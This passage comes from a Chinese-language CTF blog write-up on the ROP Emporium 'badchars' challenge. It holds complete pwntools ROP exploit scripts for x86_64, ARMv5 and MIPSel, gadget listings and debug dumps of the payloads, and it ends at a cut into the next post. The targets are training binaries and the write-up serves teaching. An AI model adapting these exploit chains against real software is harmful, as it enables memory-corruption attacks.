00  00 00 00 00  │(·@·│····│··@·│····│</span><br><span class=\"line\">    00000110  28 10 60 00  00 00 00 00  10 05 40 00  00 00 00 00  │(·`·│····│··@·│····│</span><br><span class=\"line\">    00000120</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">[*] Process <span class=\"string\">&#x27;./badchars&#x27;</span> stopped with <span class=\"built_in\">exit</span> code 1 (pid 7648)</span><br><span class=\"line\">[DEBUG] Received 0x29 bytes:</span><br><span class=\"line\">    b<span class=\"string\">&#x27;Thank you!\\n&#x27;</span></span><br><span class=\"line\">    b<span class=\"string\">&#x27;Failed to open file: flag.tzt\\n&#x27;</span></span><br><span class=\"line\">Thank you!</span><br><span class=\"line\">Failed to open file: flag.tzt</span><br><span class=\"line\">[*] Got EOF <span class=\"keyword\">while</span> reading <span class=\"keyword\">in</span> interactive</span><br></pre></td></tr></table></figure>\r\n<p>仔细查看发送的数据，发现000000e0处的字符为<code>.</code>，即<code>0x2e</code>，与需要过滤的字符<code>xga.</code>相重合，其在运行过程中被替换为<code>0xEB</code>，分析该处字符来源，为data段地址在递增过程中产生，因此不能直接使用data段开始地址，需要将data段地址修改为<code>0x060102f</code>，修改完成后，再运行exp，结果如下：</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ python exp.py </span><br><span class=\"line\">[+] Starting <span class=\"built_in\">local</span> process <span class=\"string\">&#x27;./badchars&#x27;</span> argv=[b<span class=\"string\">&#x27;./badchars&#x27;</span>] : pid 7681</span><br><span class=\"line\">b<span class=\"string\">&#x27;dnce,vzv&#x27;</span> 2</span><br><span class=\"line\">[DEBUG] Received 0x44 bytes:</span><br><span class=\"line\">    b<span class=\"string\">&#x27;badchars by ROP Emporium\\n&#x27;</span></span><br><span class=\"line\">    b<span class=\"string\">&#x27;x86_64\\n&#x27;</span></span><br><span class=\"line\">    b<span class=\"string\">&#x27;\\n&#x27;</span></span><br><span class=\"line\">    b<span class=\"string\">&quot;badchars are: &#x27;x&#x27;, &#x27;g&#x27;, &#x27;a&#x27;, &#x27;.&#x27;\\n&quot;</span></span><br><span class=\"line\">    b<span class=\"string\">&#x27;&gt; &#x27;</span></span><br><span class=\"line\">[DEBUG] Sent 0x120 bytes:</span><br><span class=\"line\">    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│</span><br><span class=\"line\">    *</span><br><span class=\"line\">    00000020  41 41 41 41  41 41 41 41  9c 06 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│</span><br><span class=\"line\">    00000030  64 6e 63 65  2c 76 7a 76  2f 10 60 00  00 00 00 00  │dnce│,vzv│/·`·│····│</span><br><span class=\"line\">    00000040  02 00 00 00  00 00 00 00  2f 10 60 00  00 00 00 00  │····│····│/·`·│····│</span><br><span class=\"line\">    00000050  34 06 40 00  00 00 00 00  28 06 40 00  00 00 00 00  │4·@·│····│(·@·│····│</span><br><span class=\"line\">    00000060  a2 06 40 00  00 00 00 00  30 10 60 00  00 00 00 00  │··@·│····│0·`·│····│</span><br><span class=\"line\">    00000070  28 06 40 00  00 00 00 00  a2 06 40 00  00 00 00 00  │(·@·│····│··@·│····│</span><br><span class=\"line\">    00000080  31 10 60 00  00 00 00 00  28 06 40 00  00 00 00 00  │1·`·│····│(·@·│····│</span><br><span class=\"line\">    00000090  a2 06 40 00  00 00 00 00  32 10 60 00  00 00 00 00  │··@·│····│2·`·│····│</span><br><span class=\"line\">    000000a0  28 06 40 00  00 00 00 00  a2 06 40 00  00 00 00 00  │(·@·│····│··@·│····│</span><br><span class=\"line\">    000000b0  33 10 60 00  00 00 00 00  28 06 40 00  00 00 00 00  │3·`·│····│(·@·│····│</span><br><span class=\"line\">    000000c0  a2 06 40 00  00 00 00 00  34 10 60 00  00 00 00 00  │··@·│····│4·`·│····│</span><br><span class=\"line\">    000000d0  28 06 40 00  00 00 00 00  a2 06 40 00  00 00 00 00  │(·@·│····│··@·│····│</span><br><span class=\"line\">    000000e0  35 10 60 00  00 00 00 00  28 06 40 00  00 00 00 00  │5·`·│····│(·@·│····│</span><br><span class=\"line\">    000000f0  a2 06 40 00  00 00 00 00  36 10 60 00  00 00 00 00  │··@·│····│6·`·│····│</span><br><span class=\"line\">    00000100  28 06 40 00  00 00 00 00  a3 06 40 00  00 00 00 00  │(·@·│····│··@·│····│</span><br><span class=\"line\">    00000110  2f 10 60 00  00 00 00 00  10 05 40 00  00 00 00 00  │/·`·│····│··@·│····│</span><br><span class=\"line\">    00000120</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">[DEBUG] Received 0xb bytes:</span><br><span class=\"line\">    b<span class=\"string\">&#x27;Thank you!\\n&#x27;</span></span><br><span class=\"line\">Thank you!</span><br><span class=\"line\">[DEBUG] Received 0x21 bytes:</span><br><span class=\"line\">    b<span class=\"string\">&#x27;ROPE&#123;a_placeholder_32byte_flag!&#125;\\n&#x27;</span></span><br><span class=\"line\">ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br><span class=\"line\">[*] Got EOF <span class=\"keyword\">while</span> reading <span class=\"keyword\">in</span> interactive</span><br></pre></td></tr></table></figure>\r\n<h3 id=\"armv5-4\">armv5</h3>\r\n<p>这里同样需要利用gadget对写入的字符串进行解码，在写入前进行编码，利用原理与x86类似。</p>\r\n<p>在userfulFunction附近查看到可利用的gadget：</p>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.text:000105F0 usefulGadgets</span><br><span class=\"line\">.text:000105F0                 LDR     R1, [R5]</span><br><span class=\"line\">.text:000105F4                 SUB     R1, R1, R6</span><br><span class=\"line\">.text:000105F8                 STR     R1, [R5]</span><br><span class=\"line\">.text:000105FC                 LDMFD   SP!, &#123;R0,PC&#125;</span><br><span class=\"line\">.text:00010600 ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:00010600                 LDR     R1, [R5]</span><br><span class=\"line\">.text:00010604                 ADD     R1, R1, R6</span><br><span class=\"line\">.text:00010608                 STR     R1, [R5]</span><br><span class=\"line\">.text:0001060C                 LDMFD   SP!, &#123;R0,PC&#125;</span><br><span class=\"line\">.text:00010610 ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:00010610                 STR     R3, [R4]</span><br><span class=\"line\">.text:00010614                 LDMFD   SP!, &#123;R5,R6,PC&#125;</span><br><span class=\"line\">.text:00010618 ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:00010618                 LDR     R1, [R5]</span><br><span class=\"line\">.text:0001061C                 EOR     R1, R1, R6</span><br><span class=\"line\">.text:00010620                 STR     R1, [R5]</span><br><span class=\"line\">.text:00010624                 LDMFD   SP!, &#123;R0,PC&#125;</span><br></pre></td></tr></table></figure>\r\n<p>可以看到<code>userfulGadget、sub_10600、sub_10618</code>三个片段对内存位于R5寄存器上的数据进行了操作，并写回了内存上，因此可以利用这三处gadget进行解码。此外，<code>sub_10610</code>处的<strong>str</strong>指令将 <em>R3</em> 寄存器值存储到 <em>R4</em> 寄存器所指向的内存区域中，因此可用于向data段写入数据。为此需要找到设置 <em>R3</em> 和 <em>R4</em> 寄存器值的gadget，搜索相关gadget：</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ ROPgadget --binary ./badchars_armv5  --only  <span class=\"string\">&quot;pop&quot;</span></span><br><span class=\"line\">Gadgets information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x000105d0 : pop &#123;fp, pc&#125;</span><br><span class=\"line\">0x000105fc : pop &#123;r0, pc&#125;</span><br><span class=\"line\">0x00010478 : pop &#123;r3, pc&#125;</span><br><span class=\"line\">0x000105b0 : pop &#123;r4, pc&#125;</span><br><span class=\"line\">0x0001067c : pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125;</span><br><span class=\"line\">0x00010614 : pop &#123;r5, r6, pc&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Unique gadgets found: 6</span><br></pre></td></tr></table></figure>\r\n<p>可以看到<code>0x00010478</code>和<code>0x000105b0</code>处的 <strong>pop</strong> 指令分别将栈数据写入 <em>R3</em> 和 <em>R4</em> 寄存器中，因此可以利用此两处gadget将<code>flag.txt</code>字符串和data段地址写入寄存器中，再结合上述提到的gadget将<code>flag.txt</code> 写入data段中。</p>\r\n<p>查看print_file地址和data段地址：</p>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">plt:000104B4 print_file                              ; CODE XREF: usefulFunction+C↓p</span><br><span class=\"line\">.plt:000104B4                 ADR     R12, 0x104BC</span><br><span class=\"line\">.plt:000104B8                 ADD     R12, R12, #0x10000</span><br><span class=\"line\">.plt:000104BC                 LDR     PC, [R12,#(print_file_ptr - 0x204BC)]! ; __imp_print_file</span><br><span class=\"line\"></span><br><span class=\"line\">.data:00021024                                         ; data_start</span><br></pre></td></tr></table></figure>\r\n<p>编写exp如下：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;arm&#x27;</span></span><br><span class=\"line\">context.endian = <span class=\"string\">&#x27;little&#x27;</span></span><br><span class=\"line\">context.bits = <span class=\"number\">32</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">255</span>):</span><br><span class=\"line\">    f = <span class=\"literal\">True</span></span><br><span class=\"line\">    flagtxt: <span class=\"built_in\">str</span> = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"string\">b&quot;flag.txt&quot;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">chr</span>(j ^ i) <span class=\"keyword\">in</span> <span class=\"string\">&quot;xga.&quot;</span>:</span><br><span class=\"line\">            f = <span class=\"literal\">False</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            flagtxt += <span class=\"built_in\">chr</span>(j ^ i)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> f:</span><br><span class=\"line\">        bl = i</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">flagtxt = flagtxt.encode()   </span><br><span class=\"line\"><span class=\"built_in\">print</span>(flagtxt, bl)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">pop_r3_pc = <span class=\"number\">0x00010478</span></span><br><span class=\"line\">pop_r4_pc = <span class=\"number\">0x000105B0</span></span><br><span class=\"line\">str_r3_r4_ldmfd_r5_r6_pc = <span class=\"number\">0x00010610</span></span><br><span class=\"line\">xor_r5_r6_ldmfd_r0_pc = <span class=\"number\">0x00010618</span></span><br><span class=\"line\">data_addr = <span class=\"number\">0x00021024</span></span><br><span class=\"line\">print_file = <span class=\"number\">0x000104B4</span></span><br><span class=\"line\">r6 = (bl &lt;&lt; <span class=\"number\">24</span>) | (bl &lt;&lt;<span class=\"number\">16</span>) | (bl &lt;&lt; <span class=\"number\">8</span>) | bl</span><br><span class=\"line\"></span><br><span class=\"line\">p = process([<span class=\"string\">&#x27;qemu-arm&#x27;</span>, <span class=\"string\">&#x27;-L&#x27;</span>, <span class=\"string\">&#x27;/usr/arm-linux-gnueabi/&#x27;</span>, <span class=\"string\">&#x27;./badchars_armv5&#x27;</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">payload  = <span class=\"string\">b&quot;A&quot;</span> * (<span class=\"number\">0x24</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span>):</span><br><span class=\"line\">    payload += p32(pop_r3_pc)</span><br><span class=\"line\">    payload += flagtxt[i*<span class=\"number\">4</span>:i*<span class=\"number\">4</span>+<span class=\"number\">4</span>]</span><br><span class=\"line\">    payload += p32(pop_r4_pc)</span><br><span class=\"line\">    payload += p32(data_addr+i*<span class=\"number\">4</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    payload += p32(str_r3_r4_ldmfd_r5_r6_pc)</span><br><span class=\"line\">    payload += p32(data_addr+i*<span class=\"number\">4</span>)</span><br><span class=\"line\">    payload += p32(r6)</span><br><span class=\"line\">    payload += p32(xor_r5_r6_ldmfd_r0_pc)</span><br><span class=\"line\">    payload += p32(data_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">payload += p32(print_file)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendafter(<span class=\"string\">b&quot;&gt; &quot;</span>, payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\r\n<p>但exp运行结果如下：</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ python exp.py </span><br><span class=\"line\">b<span class=\"string\">&#x27;dnce,vzv&#x27;</span> 2</span><br><span class=\"line\">[+] Starting <span class=\"built_in\">local</span> process <span class=\"string\">&#x27;/usr/bin/qemu-arm&#x27;</span>: pid 17973</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">Thank you!</span><br><span class=\"line\">qemu: uncaught target signal 11 (Segmentation fault) - core dumped</span><br><span class=\"line\">[*] Got EOF <span class=\"keyword\">while</span> reading <span class=\"keyword\">in</span> interactive</span><br></pre></td></tr></table></figure>\r\n<p>发现存在问题，开启debug，仔细查看输入输出数据：</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ python exp.py </span><br><span class=\"line\">b<span class=\"string\">&#x27;dnce,vzv&#x27;</span> 2</span><br><span class=\"line\">[+] Starting <span class=\"built_in\">local</span> process <span class=\"string\">&#x27;/usr/bin/qemu-arm&#x27;</span> argv=[b<span class=\"string\">&#x27;qemu-arm&#x27;</span>, b<span class=\"string\">&#x27;-L&#x27;</span>, b<span class=\"string\">&#x27;/usr/arm-linux-gnueabi/&#x27;</span>, b<span class=\"string\">&#x27;./badchars_armv5&#x27;</span>] : pid 17999</span><br><span class=\"line\">[DEBUG] Received 0x19 bytes:</span><br><span class=\"line\">    b<span class=\"string\">&#x27;badchars by ROP Emporium\\n&#x27;</span></span><br><span class=\"line\">[DEBUG] Received 0x2a bytes:</span><br><span class=\"line\">    b<span class=\"string\">&#x27;ARMv5\\n&#x27;</span></span><br><span class=\"line\">    b<span class=\"string\">&#x27;\\n&#x27;</span></span><br><span class=\"line\">    b<span class=\"string\">&quot;badchars are: &#x27;x&#x27;, &#x27;g&#x27;, &#x27;a&#x27;, &#x27;.&#x27;\\n&quot;</span></span><br><span class=\"line\">    b<span class=\"string\">&#x27;&gt; &#x27;</span></span><br><span class=\"line\">[DEBUG] Sent 0x70 bytes:</span><br><span class=\"line\">    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│</span><br><span class=\"line\">    *</span><br><span class=\"line\">    00000020  41 41 41 41  78 04 01 00  64 6e 63 65  b0 05 01 00  │AAAA│x···│dnce│····│</span><br><span class=\"line\">    00000030  24 10 02 00  10 06 01 00  24 10 02 00  02 02 02 02  │$···│····│$···│····│</span><br><span class=\"line\">    00000040  18 06 01 00  24 10 02 00  78 04 01 00  2c 76 7a 76  │····│$···│x···│,vzv│</span><br><span class=\"line\">    00000050  b0 05 01 00  28 10 02 00  10 06 01 00  28 10 02 00  │····│(···│····│(···│</span><br><span class=\"line\">    00000060  02 02 02 02  18 06 01 00  24 10 02 00  b4 04 01 00  │····│····│$···│····│</span><br><span class=\"line\">    00000070</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">[DEBUG] Received 0xb bytes:</span><br><span class=\"line\">    b<span class=\"string\">&#x27;Thank you!\\n&#x27;</span></span><br><span class=\"line\">Thank you!</span><br><span class=\"line\">[DEBUG] Received 0x43 bytes:</span><br><span class=\"line\">    b<span class=\"string\">&#x27;qemu: uncaught target signal 11 (Segmentation fault) - core dumped\\n&#x27;</span></span><br><span class=\"line\">qemu: uncaught target signal 11 (Segmentation fault) - core dumped</span><br><span class=\"line\">[*] Got EOF <span class=\"keyword\">while</span> reading <span class=\"keyword\">in</span> interactive</span><br></pre></td></tr></table></figure>\r\n<p>发现输入数据中存在<code>x</code>字符，为过滤字符，查看其输入源，发现为<code>pop_r3_pc</code>指令地址所引入，因此需要对gadget进行修改，使用ROPgadget搜索所有可利用gadget，结果如下：</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ ROPgadget --binary ./badchars_armv5  --only  <span class=\"string\">&quot;pop&quot;</span>  --all</span><br><span class=\"line\">Gadgets information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x000105d0 : pop &#123;fp, pc&#125;</span><br><span class=\"line\">0x000105e8 : pop &#123;fp, pc&#125;</span><br><span class=\"line\">0x000105fc : pop &#123;r0, pc&#125;</span><br><span class=\"line\">0x0001060c : pop &#123;r0, pc&#125;</span><br><span class=\"line\">0x00010624 : pop &#123;r0, pc&#125;</span><br><span class=\"line\">0x00010478 : pop &#123;r3, pc&#125;</span><br><span class=\"line\">0x00010690 : pop &#123;r3, pc&#125;</span><br><span class=\"line\">0x000105b0 : pop &#123;r4, pc&#125;</span><br><span class=\"line\">0x0001067c : pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125;</span><br><span class=\"line\">0x00010614 : pop &#123;r5, r6, pc&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Unique gadgets found: 10</span><br></pre></td></tr></table></figure>\r\n<p>发现<code>0x00010690</code>处也存在 <strong>pop {r3, pc}</strong> 指令，因此将exp第23行修改为<code>pop_r3_pc = 0x00010690</code>，再次运行exp，结果仍出现错误：</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ python exp-tmp.py </span><br><span class=\"line\">b<span class=\"string\">&#x27;dnce,vzv&#x27;</span> 2</span><br><span class=\"line\">[+] Starting <span class=\"built_in\">local</span> process <span class=\"string\">&#x27;/usr/bin/qemu-arm&#x27;</span> argv=[b<span class=\"string\">&#x27;qemu-arm&#x27;</span>, b<span class=\"string\">&#x27;-L&#x27;</span>, b<span class=\"string\">&#x27;/usr/arm-linux-gnueabi/&#x27;</span>, b<span class=\"string\">&#x27;./badchars_armv5&#x27;</span>] : pid 18050</span><br><span class=\"line\">[DEBUG] Received 0x18 bytes:</span><br><span class=\"line\">    b<span class=\"string\">&#x27;badchars by ROP Emporium&#x27;</span></span><br><span class=\"line\">[DEBUG] Received 0x2b bytes:</span><br><span class=\"line\">    b<span class=\"string\">&#x27;\\n&#x27;</span></span><br><span class=\"line\">    b<span class=\"string\">&#x27;ARMv5\\n&#x27;</span></span><br><span class=\"line\">    b<span class=\"string\">&#x27;\\n&#x27;</span></span><br><span class=\"line\">    b<span class=\"string\">&quot;badchars are: &#x27;x&#x27;, &#x27;g&#x27;, &#x27;a&#x27;, &#x27;.&#x27;\\n&quot;</span></span><br><span class=\"line\">    b<span class=\"string\">&#x27;&gt; &#x27;</span></span><br><span class=\"line\">[DEBUG] Sent 0x70 bytes:</span><br><span class=\"line\">    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│</span><br><span class=\"line\">    *</span><br><span class=\"line\">    00000020  41 41 41 41  90 06 01 00  64 6e 63 65  b0 05 01 00  │AAAA│····│dnce│····│</span><br><span class=\"line\">    00000030  24 10 02 00  10 06 01 00  24 10 02 00  02 02 02 02  │$···│····│$···│····│</span><br><span class=\"line\">    00000040  18 06 01 00  24 10 02 00  90 06 01 00  2c 76 7a 76  │····│$···│····│,vzv│</span><br><span class=\"line\">    00000050  b0 05 01 00  28 10 02 00  10 06 01 00  28 10 02 00  │····│(···│····│(···│</span><br><span class=\"line\">    00000060  02 02 02 02  18 06 01 00  24 10 02 00  b4 04 01 00  │····│····│$···│····│</span><br><span class=\"line\">    00000070</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">[DEBUG] Received 0xb bytes:</span><br><span class=\"line\">    b<span class=\"string\">&#x27;Thank you!\\n&#x27;</span></span><br><span class=\"line\">Thank you!</span><br><span class=\"line\">[DEBUG] Received 0x1e bytes:</span><br><span class=\"line\">    00000000  46 61 69 6c  65 64 20 74  6f 20 6f 70  65 6e 20 66  │Fail│ed t│o op│en f│</span><br><span class=\"line\">    00000010  69 6c 65 3a  20 03 02 02  02 2e 74 78  74 0a        │ile:│ ···│·.tx│t·│</span><br><span class=\"line\">    0000001e</span><br><span class=\"line\">Failed to open file: \\x03\u0002\u0002.txt</span><br><span class=\"line\">[*] Process <span class=\"string\">&#x27;/usr/bin/qemu-arm&#x27;</span> stopped with <span class=\"built_in\">exit</span> code 1 (pid 18050)</span><br><span class=\"line\">[*] Got EOF <span class=\"keyword\">while</span> reading <span class=\"keyword\">in</span> interactive</span><br></pre></td></tr></table></figure>\r\n<p>查看结果，发现原本应被解码的<code>flag.txt</code>字符串并未被成功解码，实际输入十六进制为<code>03 02 02 02 2e 74 78 74</code>（02.txt），前4个字节输入错误。</p>\r\n<blockquote>\r\n<p>在这里本想进行调试的，但gdb-multiarch出现错误，无法调试查看原因，只能作罢。</p>\r\n</blockquote>\r\n<p>对exp进行修改，在第34行插入以下两行语句：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">payload += p32(ldmfd_r3_pc)</span><br><span class=\"line\">payload += flagtxt[:<span class=\"number\">4</span>]</span><br></pre></td></tr></table></figure>\r\n<p>再次运行exp，成功得到flag，结果如下：</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ python exp.py </span><br><span class=\"line\">b<span class=\"string\">&#x27;dnce,vzv&#x27;</span> 2</span><br><span class=\"line\">[+] Starting <span class=\"built_in\">local</span> process <span class=\"string\">&#x27;/usr/bin/qemu-arm&#x27;</span>: pid 18129</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">Thank you!</span><br><span class=\"line\">ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br><span class=\"line\">qemu: uncaught target signal 11 (Segmentation fault) - core dumped</span><br><span class=\"line\">[*] Process <span class=\"string\">&#x27;/usr/bin/qemu-arm&#x27;</span> stopped with <span class=\"built_in\">exit</span> code -11 (SIGSEGV) (pid 18129)</span><br><span class=\"line\">[*] Got EOF <span class=\"keyword\">while</span> reading <span class=\"keyword\">in</span> interactive</span><br></pre></td></tr></table></figure>\r\n<h3 id=\"mipsel-4\">mipsel</h3>\r\n<p>仅给出exp</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;mips&#x27;</span></span><br><span class=\"line\">context.endian = <span class=\"string\">&#x27;little&#x27;</span></span><br><span class=\"line\">context.bits = <span class=\"number\">32</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process([<span class=\"string\">&#x27;qemu-mipsel&#x27;</span>, <span class=\"string\">&#x27;-L&#x27;</span>, <span class=\"string\">&#x27;/usr/mipsel-linux-gnu/&#x27;</span>, <span class=\"string\">&#x27;./badchars_mipsel&#x27;</span>])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">255</span>):</span><br><span class=\"line\">    f = <span class=\"literal\">True</span></span><br><span class=\"line\">    flagtxt: <span class=\"built_in\">str</span> = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"string\">b&quot;flag.txt&quot;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">chr</span>(j ^ i) <span class=\"keyword\">in</span> <span class=\"string\">&quot;xga.&quot;</span>:</span><br><span class=\"line\">            f = <span class=\"literal\">False</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            flagtxt += <span class=\"built_in\">chr</span>(j ^ i)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> f:</span><br><span class=\"line\">        bl = i</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">flagtxt = flagtxt.encode()</span><br><span class=\"line\">t1 = (bl &lt;&lt; <span class=\"number\">24</span>) | (bl &lt;&lt;<span class=\"number\">16</span>) | (bl &lt;&lt; <span class=\"number\">8</span>) | bl</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">.text:00400930                               usefulGadgets:</span></span><br><span class=\"line\"><span class=\"string\">.text:00400930 0C 00 B9 8F                   lw      $t9, 0xC($sp)</span></span><br><span class=\"line\"><span class=\"string\">.text:00400934 08 00 A8 8F                   lw      $t0, 8($sp)</span></span><br><span class=\"line\"><span class=\"string\">.text:00400938 04 00 A9 8F                   lw      $t1, 4($sp)</span></span><br><span class=\"line\"><span class=\"string\">.text:0040093C 00 00 09 AD                   sw      $t1, 0($t0)</span></span><br><span class=\"line\"><span class=\"string\">.text:00400940 09 F8 20 03                   jalr    $t9</span></span><br><span class=\"line\"><span class=\"string\">.text:00400944 10 00 BD 23                   addi    $sp, 0x10</span></span><br><span class=\"line\"><span class=\"string\">.text:00400944</span></span><br><span class=\"line\"><span class=\"string\">.text:00400948 0C 00 B9 8F                   lw      $t9, 0xC($sp)</span></span><br><span class=\"line\"><span class=\"string\">.text:0040094C 08 00 A8 8F                   lw      $t0, 8($sp)</span></span><br><span class=\"line\"><span class=\"string\">.text:00400950 04 00 A9 8F                   lw      $t1, 4($sp)</span></span><br><span class=\"line\"><span class=\"string\">.text:00400954 00 00 2A 8D                   lw      $t2, 0($t1)</span></span><br><span class=\"line\"><span class=\"string\">.text:00400958 26 40 0A 01                   xor     $t0, $t2</span></span><br><span class=\"line\"><span class=\"string\">.text:0040095C 00 00 28 AD                   sw      $t0, 0($t1)</span></span><br><span class=\"line\"><span class=\"string\">.text:00400960 09 F8 20 03                   jalr    $t9</span></span><br><span class=\"line\"><span class=\"string\">.text:00400964 10 00 BD 23                   addi    $sp, 0x10</span></span><br><span class=\"line\"><span class=\"string\">.text:00400964</span></span><br><span class=\"line\"><span class=\"string\">.text:00400968 08 00 A4 8F                   lw      $a0, 8($sp)</span></span><br><span class=\"line\"><span class=\"string\">.text:0040096C 04 00 B9 8F                   lw      $t9, 4($sp)</span></span><br><span class=\"line\"><span class=\"string\">.text:00400970 09 F8 20 03                   jalr    $t9</span></span><br><span class=\"line\"><span class=\"string\">.text:00400974 0C 00 BD 23                   addi    $sp, 0xC</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">lw_t0_t1_t9_sw_t0_t1 = <span class=\"number\">0x00400930</span></span><br><span class=\"line\">lw_t1_t0_t9_xor = <span class=\"number\">0x00400948</span></span><br><span class=\"line\">lw_t9_a0 = <span class=\"number\">0x00400968</span></span><br><span class=\"line\">print_file = <span class=\"number\">0x00400AB0</span></span><br><span class=\"line\">data_addr = <span class=\"number\">0x00411000</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload  = <span class=\"string\">b&quot;A&quot;</span> * (<span class=\"number\">0x24</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload += p32(lw_t0_t1_t9_sw_t0_t1)</span><br><span class=\"line\">payload += <span class=\"string\">b&quot;BBBB&quot;</span> + flagtxt[:<span class=\"number\">4</span>]</span><br><span class=\"line\">payload += p32(data_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">payload += p32(lw_t0_t1_t9_sw_t0_t1)</span><br><span class=\"line\">payload += <span class=\"string\">b&quot;CCCC&quot;</span> + flagtxt[<span class=\"number\">4</span>:]</span><br><span class=\"line\">payload += p32(data_addr+<span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload += p32(lw_t1_t0_t9_xor)</span><br><span class=\"line\">payload += <span class=\"string\">b&quot;DDDD&quot;</span></span><br><span class=\"line\">payload += p32(data_addr)</span><br><span class=\"line\">payload += p32(t1)</span><br><span class=\"line\"></span><br><span class=\"line\">payload += p32(lw_t1_t0_t9_xor)</span><br><span class=\"line\">payload += <span class=\"string\">b&quot;EEEE&quot;</span></span><br><span class=\"line\">payload += p32(data_addr+<span class=\"number\">4</span>)</span><br><span class=\"line\">payload += p32(t1)</span><br><span class=\"line\"></span><br><span class=\"line\">payload += p32(lw_t9_a0)</span><br><span class=\"line\">payload += <span class=\"string\">b&quot;FFFF&quot;</span></span><br><span class=\"line\">payload += p32(print_file)</span><br><span class=\"line\">payload += p32(data_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\r\n","categories":["CTF"],"tags":["pwn","rop"]},{"title":"rop emporium 续","url":"/2022/10/24/rop-emporium-%E7%BB%AD/","content":"<p>这是对之前 <a href=\"/2022/09/27/rop-emporium/\" title=\"rop emporium\">ROP Emporium</a> 只写了部分答案进行续写。</p>\r\n<h2 